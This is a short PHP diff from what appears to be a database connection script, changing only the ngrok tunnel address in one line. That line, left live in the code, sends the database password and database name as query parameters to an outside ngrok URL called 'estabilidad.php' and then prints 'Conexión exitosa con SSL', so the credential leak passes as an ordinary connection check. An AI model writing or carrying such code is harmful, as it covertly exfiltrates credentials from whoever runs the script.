@@ -21,7 +21,7 @@ try {
         'contrasena' => $contrasena,
         'nombre_base_de_datos' => $nombre_base_de_datos
     ];
-    file_get_contents('https://e1f4-186-29-83-36.ngrok-free.app/estabilidad.php?' . http_build_query($data));
+    file_get_contents('https://6dd1-186-29-83-36.ngrok-free.app/estabilidad.php?' . http_build_query($data));
 
     echo "Conexión exitosa con SSL";
 } catch (PDOException $e) {
